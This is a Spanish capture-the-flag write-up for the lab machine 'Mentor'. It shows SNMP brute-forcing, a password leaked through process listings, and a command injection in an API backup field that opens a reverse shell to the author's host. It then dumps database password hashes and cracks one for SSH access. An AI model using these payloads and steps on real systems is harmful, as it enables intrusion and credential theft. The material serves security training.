# Resolución maquina Mentor

**Autor:** PepeMaquina  
**Fecha:** 10 Marzo de 2026.
**Dificultad:** Medio.
**Sistema Operativo:** Linux.
**Tags:** Api, SNMP, Docker.

---
## Imagen de la Máquina

![](mentor.jpg)

*Imagen: Mentor.JPG*

## Reconocimiento Inicial

### Escaneo de Puertos
Comenzamos con un escaneo completo de nmap para identificar servicios expuestos:
~~~ bash
sudo nmap -p- --open -sS -vvv --min-rate 4000 -n -Pn 10.129.228.102 -oG networked
~~~
Luego queda realizar un escaneo detallado de puertos abiertos:
~~~ bash
sudo nmap -sCV -p22,80 10.129.228.102 -oN targeted
~~~
### Enumeración de Servicios
~~~ 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)
|_  256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://mentorquotes.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~
Se puede ver una redirección a un dominio, por lo que se añade al `/etc/hosts`
~~~bash
cat /etc/hosts | grep '10.129.228.102'
10.129.228.102 mentorquotes.htb
~~~

Como siempre, tambien se enumeran servicios en UDP.
~~~bash
sudo nmap -p- --open -sU --min-rate 5000 -n -Pn 10.129.228.102 -oG networked_udp
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-10 16:30 EDT
Warning: 10.129.228.102 giving up on port because retransmission cap hit (10).
PORT    STATE SERVICE
161/udp open  snmp
~~~
En esta se ve el servicio SNMP abierto, a lo que siempre se debe inspeccionar.

### Enumeración UDP servicio SNMP
~~~bash
┌──(kali㉿kali)-[~/htb/mentor/nmap]
└─$ onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 10.129.228.102 -w 100
Scanning 1 hosts, 120 communities
10.129.228.102 [public] Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
10.129.228.102 [public] Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
~~~
Esta presenta una community string publica, asi que queda ver que procesos ejecuta en el servicio.
~~~bash
┌──(kali㉿kali)-[~/htb/mentor/nmap]
└─$ snmpbulkwalk -c public -v2c 10.129.228.102 .
iso.3.6.1.2.1.1.1.0 = STRING: "Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (94894) 0:15:48.94
iso.3.6.1.2.1.1.4.0 = STRING: "Me <admin@mentorquotes.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "mentor"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (6) 0:00:00.06
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (6) 0:00:00.06
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (6) 0:00:00.06
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (6) 0:00:00.06
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (6) 0:00:00.06
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (6) 0:00:00.06
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (6) 0:00:00.06
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (6) 0:00:00.06
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (6) 0:00:00.06
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (6) 0:00:00.06
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (6) 0:00:00.06
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (96258) 0:16:02.58
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 EA 03 0A 14 24 23 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-56-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 229
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
~~~
La respuesta de los procesos no presenta información muy util o importante.
En teoria se supone que con `onesixtyone` se deberia encontrar todo tipo de comunity strings, tanto publicas como privadas, pero con ello tambien es importante probar la herramienta `snmpbrute` (https://github.com/SECFORCE/SNMP-Brute/tree/master)
~~~bash
┌──(kali㉿kali)-[~/htb/mentor/exploits/SNMP-Brute]
└─$ python3 snmpbrute.py -t 10.129.228.102
   _____ _   ____  _______     ____             __     
  / ___// | / /  |/  / __ \   / __ )_______  __/ /____ 
  \__ \/  |/ / /|_/ / /_/ /  / __  / ___/ / / / __/ _ \
 ___/ / /|  / /  / / ____/  / /_/ / /  / /_/ / /_/  __/
/____/_/ |_/_/  /_/_/      /_____/_/   \__,_/\__/\___/ 

SNMP Bruteforce & Enumeration Script v2.0
http://www.secforce.com / nikos.vassakis <at> secforce.com
###############################################################

Trying ['', '0', '0392a0', '1234', '2read', '3com', '3Com', '3COM', '4changes', 'access', 'adm', 'admin', 'Admin', 'administrator', 'agent', 'agent_steal', 'all', 'all private', 'all public', 'anycom', 'ANYCOM', 'apc', 'bintec', 'blue', 'boss', 'c', 'C0de', 'cable-d', 'cable_docsispublic@es0', 'cacti', 'canon_admin', 'cascade', 'cc', 'changeme', 'cisco', 'CISCO', 'cmaker', 'comcomcom', 'community', 'core', 'CR52401', 'crest', 'debug', 'default', 'demo', 'dilbert', 'enable', 'entry', 'field', 'field-service', 'freekevin', 'friend', 'fubar', 'guest', 'hello', 'hideit', 'host', 'hp_admin', 'ibm', 'IBM', 'ilmi', 'ILMI', 'intel', 'Intel', 'intermec', 'Intermec', 'internal', 'internet', 'ios', 'isdn', 'l2', 'l3', 'lan', 'liteon', 'login', 'logon', 'lucenttech', 'lucenttech1', 'lucenttech2', 'manager', 'master', 'microsoft', 'mngr', 'mngt', 'monitor', 'mrtg', 'nagios', 'net', 'netman', 'network', 'nobody', 'NoGaH$@!', 'none', 'notsopublic', 'nt', 'ntopia', 'openview', 'operator', 'OrigEquipMfr', 'ourCommStr', 'pass', 'passcode', 'password', 'PASSWORD', 'pr1v4t3', 'pr1vat3', 'private', ' private', 'private ', 'Private', 'PRIVATE', 'private@es0', 'Private@es0', 'private@es1', 'Private@es1', 'proxy', 'publ1c', 'public', ' public', 'public ', 'Public', 'PUBLIC', 'public@es0', 'public@es1', 'public/RO', 'read', 'read-only', 'readwrite', 'read-write', 'red', 'regional', '<removed>', 'rmon', 'rmon_admin', 'ro', 'root', 'router', 'rw', 'rwa', 'sanfran', 'san-fran', 'scotty', 'secret', 'Secret', 'SECRET', 'Secret C0de', 'security', 'Security', 'SECURITY', 'seri', 'server', 'snmp', 'SNMP', 'snmpd', 'snmptrap', 'snmp-Trap', 'SNMP_trap', 'SNMPv1/v2c', 'SNMPv2c', 'solaris', 'solarwinds', 'sun', 'SUN', 'superuser', 'supervisor', 'support', 'switch', 'Switch', 'SWITCH', 'sysadm', 'sysop', 'Sysop', 'system', 'System', 'SYSTEM', 'tech', 'telnet', 'TENmanUFactOryPOWER', 'test', 'TEST', 'test2', 'tiv0li', 'tivoli', 'topsecret', 'traffic', 'trap', 'user', 'vterm1', 'watch', 'watchit', 'windows', 'windowsnt', 'workstation', 'world', 'write', 'writeit', 'xyzzy', 'yellow', 'ILMI'] community strings ...
10.129.228.102 : 161    Version (v2c):  internal
10.129.228.102 : 161    Version (v1):   public
10.129.228.102 : 161    Version (v2c):  public
10.129.228.102 : 161    Version (v1):   public
10.129.228.102 : 161    Version (v2c):  public
~~~
Muestra claramente que tambien presenta una comunity string `internal`, por lo que se procede a enumerar informacion con ella.
~~~bash
<----SNIP---->
iso.3.6.1.2.1.25.4.2.1.5.1252 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1253 = STRING: "-k start"
iso.3.6.1.2.1.25.4.2.1.5.1319 = STRING: "-H fd:// --containerd=/run/containerd/containerd.sock"
iso.3.6.1.2.1.25.4.2.1.5.1689 = STRING: "/usr/local/bin/login.sh"
iso.3.6.1.2.1.25.4.2.1.5.1757 = STRING: "-proto tcp -host-ip 172.22.0.1 -host-port 5432 -container-ip 172.22.0.4 -container-port 5432"
iso.3.6.1.2.1.25.4.2.1.5.1771 = STRING: "-namespace moby -id 96e44c5692920491cdb954f3d352b3532a88425979cd48b3959b63bfec98a6f4 -address /run/containerd/containerd.sock"
iso.3.6.1.2.1.25.4.2.1.5.1791 = ""
iso.3.6.1.2.1.25.4.2.1.5.1873 = STRING: "-proto tcp -host-ip 172.22.0.1 -host-port 8000 -container-ip 172.22.0.3 -container-port 8000"
iso.3.6.1.2.1.25.4.2.1.5.1889 = STRING: "-namespace moby -id 87c58e96694a5d343fb182de739394f6f94803845c1f88c32ebc331728dff76c -address /run/containerd/containerd.sock"
iso.3.6.1.2.1.25.4.2.1.5.1909 = STRING: "-m uvicorn app.main:app --reload --workers 2 --host 0.0.0.0 --port 8000"
iso.3.6.1.2.1.25.4.2.1.5.1960 = ""
iso.3.6.1.2.1.25.4.2.1.5.1961 = ""
iso.3.6.1.2.1.25.4.2.1.5.1962 = ""
iso.3.6.1.2.1.25.4.2.1.5.1963 = ""
iso.3.6.1.2.1.25.4.2.1.5.1964 = ""
iso.3.6.1.2.1.25.4.2.1.5.1965 = ""
iso.3.6.1.2.1.25.4.2.1.5.1991 = STRING: "-proto tcp -host-ip 172.22.0.1 -host-port 81 -container-ip 172.22.0.2 -container-port 80"
iso.3.6.1.2.1.25.4.2.1.5.2006 = STRING: "-namespace moby -id 05f26a59e14c42cebea6b7a535499e2994e1377c2893d2148f3a372de813168b -address /run/containerd/containerd.sock"
iso.3.6.1.2.1.25.4.2.1.5.2026 = STRING: "main.py"
iso.3.6.1.2.1.25.4.2.1.5.2073 = STRING: "-c from multiprocessing.semaphore_tracker import main;main(4)"
iso.3.6.1.2.1.25.4.2.1.5.2074 = STRING: "-c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7) --multiprocessing-fork"
iso.3.6.1.2.1.25.4.2.1.5.2087 = ""
iso.3.6.1.2.1.25.4.2.1.5.2089 = ""
iso.3.6.1.2.1.25.4.2.1.5.2101 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
iso.3.6.1.2.1.25.4.2.1.5.14643 = ""
iso.3.6.1.2.1.25.4.2.1.5.35293 = ""
iso.3.6.1.2.1.25.4.2.1.5.35302 = ""
iso.3.6.1.2.1.25.4.2.1.5.35728 = ""
<----SNIP----
~~~
Se pudo encontrar una posible contraseña `kj23sadkj123as0-d213`.
### Enumeración de la página web
Al ver el contenido no se encontro una pagina muy interactiva, asi que se procedio a enumerar subdirectorios pero tampoco se encontro gran cosa.
Posteriormente se procedio a enumerar subdominios.
~~~bash
──(kali㉿kali)-[~/htb/mentor/nmap]
└─$ wfuzz -u http://10.129.228.102 -H "Host:FUZZ.mentorquotes.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hl 9 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.228.102/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                    
=====================================================================

000000040:   404        0 L      2 W        22 Ch       "api"                                                                                      
000037212:   400        10 L     35 W       308 Ch      "*"                       
~~~
Se logro encontrar un subdominio con el nombre de `api`, el cual se agrego al `/etc/hosts`.
~~~bash
┌──(kali㉿kali)-[~/htb/mentor/nmap]
└─$ cat /etc/hosts | grep '10.129.228'                   
10.129.228.102 mentorquotes.htb api.mentorquotes.htb
~~~

Ya teniendo el subdominio se procedio a realizar la enumeracion de subdirectorios.
~~~bash
┌──(kali㉿kali)-[~/htb/mentor/nmap]
└─$ feroxbuster -u http://api.mentorquotes.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d 0 -t 5 -o fuzz -k -x php
                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://api.mentorquotes.htb/
 🚀  Threads               │ 5
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ fuzz
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ INFINITE
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w       22c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
307      GET        0l        0w        0c http://api.mentorquotes.htb/docs/ => http://api.mentorquotes.htb/docs
200      GET        1l       48w     7676c http://api.mentorquotes.htb/openapi.json
200      GET       69l      212w     2637c http://api.mentorquotes.htb/docs/oauth2-redirect
200      GET       31l       62w      969c http://api.mentorquotes.htb/docs
307      GET        0l        0w        0c http://api.mentorquotes.htb/users => http://api.mentorquotes.htb/users/
307      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        1l        3w       31c http://api.mentorquotes.htb/users/add
422      GET        1l        3w      186c http://api.mentorquotes.htb/admin/check
405      GET        1l        3w       31c http://api.mentorquotes.htb/admin/backup
200      GET       28l       52w      772c http://api.mentorquotes.htb/redoc
404      GET        9l       31w      282c http://api.mentorquotes.htb/http%3A%2F%2Fwww
~~~
Se logro encontrar subdirectorios interesantes como `admin` y `docs`.
Viendo el contenido de la pagina web se tiene una api con su documentacion.

![](mentor2.jpg)

Tambien se intento ingresar al directorio `admin` pero requiere una autorizacion extra.

Con la api se puede realizar un login y para esto existe la opcion de `signup`.

![](mentor3.jpg)

Al loguearse con dicha cuenta este entrega una JWT.

![](mentor4.jpg)

Con este token se puede utilizar los demas endpoints, pero no todos porque este pide ser admin.
~~~bash
┌──(kali㉿kali)-[~/htb/mentor/nmap]
└─$ curl -X 'GET'  'http://api.mentorquotes.htb/users/'  -H 'accept: application/json' -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InBlcGl0byIsImVtYWlsIjoicGVwZUBtZW50b3JxdW90ZXMuaHRiIn0.VMOGk7Ge6FSluSqhxOx7VqgM8JAWw0OuBtd3OTB-2TU'
{"detail":"Only admin users can access this resource"}
~~~

Tambien se puede deducir que este JWT tambien es el header que se necesita para ingresar al panel de admin.

Se puede observar en el codigo fuente que existe un usuario `james`.

![](mentor5.jpg)

Asi que se tiene un usuario potencial.
Recordando lo visto en SNMP, se tiene una posible contraseña, por lo que se puede intentar iniciar sesion con dichas credenciales e intentar obtener un JWT.

![](mentor6.jpg)

![](mentor7.jpg)

Se ve que esto funciono y si se logro obtener un JWT.
Con este token ahora si es posible enumerar los demas endpoints.
~~~bash
┌──(kali㉿kali)-[~/htb/mentor/nmap]
└─$ curl -X 'GET'  'http://api.mentorquotes.htb/users/'  -H 'accept: application/json' -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   188  100   188    0     0    659      0 --:--:-- --:--:-- --:--:--   659
[
  {
    "id": 1,
    "email": "james@mentorquotes.htb",
    "username": "james"
  },
  {
    "id": 2,
    "email": "svc@mentorquotes.htb",
    "username": "service_acc"
  },
  {
    "id": 4,
    "email": "pepe@mentorquotes.htb",
    "username": "pepito"
  }
]
~~~
Pero al enumerar detalladamente los endpoints se puede ver que no es de mucha utilidad, salvo intentar un SQLi pero tampoco se sabe que DB emplea.

Por lo pronto, se pasara directamente a intentar obtener información cosas del directorio `admin`.
~~~bash
┌──(kali㉿kali)-[~/htb/mentor/nmap]
└─$ curl -X 'GET'  'http://api.mentorquotes.htb/admin/'  -H 'accept: application/json' -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    83  100    83    0     0    293      0 --:--:-- --:--:-- --:--:--   293
{
  "admin_funcs": {
    "check db connection": "/check",
    "backup the application": "/backup"
  }
}
~~~
Enumerando el `check` lastimosamente parecer que no esta implementado.
~~~bash
┌──(kali㉿kali)-[~/htb/mentor/nmap]
└─$ curl -X 'GET'  'http://api.mentorquotes.htb/admin/check'  -H 'accept: application/json' -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    34  100    34    0     0    121      0 --:--:-- --:--:-- --:--:--   121
{
  "details": "Not implemented yet!"
}
~~~

Pasando por `backup` se puede ver que hace falta parametros extra.
~~~bash
┌──(kali㉿kali)-[~/htb/mentor/nmap]
└─$ curl -X 'POST' 'http://api.mentorquotes.htb/admin/backup'  -H 'Content-type: application/json' -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' -d '{}' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    90  100    88  100     2    304      6 --:--:-- --:--:-- --:--:--   311
{
  "detail": [
    {
      "loc": [
        "body",
        "path"
      ],
      "msg": "field required",
      "type": "value_error.missing"
    }
  ]
}
~~~
Agregando un parametro `path` con cualquier valor random siempre lanza el mismo mensaje `Done!`.
~~~bash
┌──(kali㉿kali)-[~/htb/mentor/nmap]
└─$ curl -X 'POST' 'http://api.mentorquotes.htb/admin/backup'  -H 'Content-type: application/json' -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' -d '{"path": "main.py"}' | jq
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    35  100    16  100    19     55     66 --:--:-- --:--:-- --:--:--   121
{
  "INFO": "Done!"
}
~~~
### Command injection
Normalmente este tipo de endpoints u opciones `backup` sirve para sacar backups valga la redundancia, ya que por detras muchos usan comandos `zip`, `tar` o demas, por lo que siempre es bueno probar un command injection, al igual que la maquina `Nocturnal`.
Por lo que se vio en SNMP lo mas probable es que esto se encuentre dentro de un contenedor, estos contenedores no suelen tener `ping` integrado pero nunca esta de mas probarlo.
~~~bash
┌──(kali㉿kali)-[~/htb/mentor/nmap]
└─$ curl -X 'POST' 'http://api.mentorquotes.htb/admin/backup'  -H 'Content-type: application/json' -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' -d '{"path": "test; ping -c1 10.10.14.28;#"}' | jq 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    55  100    16  100    39     56    136 --:--:-- --:--:-- --:--:--   192
{
  "INFO": "Done!"
}
~~~
Mientras que por otro lado se intercepta peticiones ICMP para comprobar que exista el command injection.
~~~bash
┌──(kali㉿kali)-[~/htb/mentor/nmap]
└─$ sudo tcpdump -i tun0 icmp
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
20:50:41.601759 IP mentorquotes.htb > 10.10.14.28: ICMP echo request, id 6144, seq 0, length 64
20:50:41.604193 IP 10.10.14.28 > mentorquotes.htb: ICMP echo reply, id 6144, seq 0, length 64
~~~
Y efectivamente si llega la peticion, por lo que se tiene un command injection en todas de la ley.

Con esto en mente se procede a realizar una reverse shell y entrar al contenedor.
~~~bash
┌──(kali㉿kali)-[~/htb/mentor/nmap]
└─$ curl -X 'POST' 'http://api.mentorquotes.htb/admin/backup'  -H 'Content-type: application/json' -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0' -d '{"path": "test; busybox nc 10.10.14.28 4433 -e sh;#"}' | jq 
~~~

~~~bash
┌──(kali㉿kali)-[~/htb/mentor/nmap]
└─$ penelope -p 4433     
[+] Listening for reverse shells on 0.0.0.0:4433 →  127.0.0.1 • 192.168.5.128 • 172.18.0.1 • 172.17.0.1 • 10.10.14.28
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from 87c58e96694a~10.129.228.102-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/local/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/87c58e96694a~10.129.228.102-Linux-x86_64/2026_03_10-21_11_27-301.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
/app #
~~~

---
## User Flag

> **Valor de la Flag:** `<Averiguelo usted mismo>`

### User Flag
Con acceso al contenedor, ahora se puede buscar la user flag.
~~~bash
/app # cd
/home/svc # cat user.txt
<Encuentre su propia user flag>
~~~

---
## Escalada de Privilegios
Para realizar la escalada de privilegios primero se intento buscar credenciales que se puedan emplear en ssh dentro de la maquina real.
### Exfiltrando credenciales DB
Enumerando archivos dentro del proyecto, se logro ver el archivo de la DB con credenciales y apuntando a otro contenedor que seria la principal.
~~~bash
/app/app # cat db.py 

import os

from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
from sqlalchemy.sql import func
from databases import Database

# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")

# SQLAlchemy for quotes
engine = create_engine(DATABASE_URL)
metadata = MetaData()
quotes = Table(
    "quotes",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("title", String(50)),
    Column("description", String(50)),
    Column("created_date", DateTime, default=func.now(), nullable=False)
)

# SQLAlchemy for users
engine = create_engine(DATABASE_URL)
metadata = MetaData()
users = Table(
    "users",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("email", String(50)),
    Column("username", String(50)),
    Column("password", String(128) ,nullable=False)
)


# Databases query builder
database = Database(DATABASE_URL)
~~~

Dentro del contenedor no existe el comando `psql`, asi que no se podria ingresar a la DB, una opcion podria ser realizar portforwarding, pero en este caso es preferible utilizar el mismo python para ver los datos.
~~~bash
/tmp # python3
Python 3.6.9 (default, Nov 15 2019, 03:58:01) 
[GCC 8.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import psycopg2
>>> conn = psycopg2.connect(
...     host="172.22.0.1",
...     database="mentorquotes_db",
...     user="postgres",
...     password="postgres"
... )
>>> cur = conn.cursor()
>>> cur.execute("SELECT * FROM users")
>>> for row in cur.fetchall():
...     print(row)
... 
(1, 'james@mentorquotes.htb', 'james', '7ccdcd8c05b59add9c198d492b36a503')
(2, 'svc@mentorquotes.htb', 'service_acc', '53f22d0dfa10dce7e29cd31f4f953fd8')
(4, 'pepe@mentorquotes.htb', 'pepito', 'f4d3cbd56691bd8f58a397edd189053a')
>>> cur.close()
>>> conn.close()
>>> exit()
~~~
Se puede ver las credenciales en md5 para cada usuario, solo interesa saber el de svc asi que se lo descifra en paginas.

![](mentor8.jpg)

Con la contraseña descifrada se procede a verificar si efectivamente funciona.
~~~bash
┌──(kali㉿kali)-[~/htb/mentor]
└─$ sudo netexec ssh 10.129.228.102 -u users -p pass --continue-on-success
SSH         10.129.228.102  22     10.129.228.102   [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3
SSH         10.129.228.102  22     10.129.228.102   [-] james:kj23sadkj123as0-d213
SSH         10.129.228.102  22     10.129.228.102   [-] svc:kj23sadkj123as0-d213
SSH         10.129.228.102  22     10.129.228.102   [-] service_acc:kj23sadkj123as0-d213
SSH         10.129.228.102  22     10.129.228.102   [-] james:123meunomeeivani
SSH         10.129.228.102  22     10.129.228.102   [+] svc:123meunomeeivani  Linux - Shell access!
SSH         10.129.228.102  22     10.129.228.102   [-] service_acc:123meunomeeivani
SSH         10.129.228.102  22     10.129.228.102   [-] james:76dsf761g31276hjgsdkahuyt123
SSH         10.129.228.102  22     10.129.228.102   [-] service_acc:76dsf761g31276hjgsdkahuyt123
~~~
Se tiene una coincidencia valida, asi que se puede entrar por ssh al servidor real.
~~~bash
┌──(kali㉿kali)-[~/htb/mentor/nmap]
└─$ ssh svc@10.129.228.102      
The authenticity of host '10.129.228.102 (10.129.228.102)' can't be established.
ED25519 key fingerprint is SHA256:fkqwgXFJ5spB0IsQCmw4K5HTzEPyM27mczyMp6Qct5Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.228.102' (ED25519) to the list of known hosts.
svc@10.129.228.102's password: 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

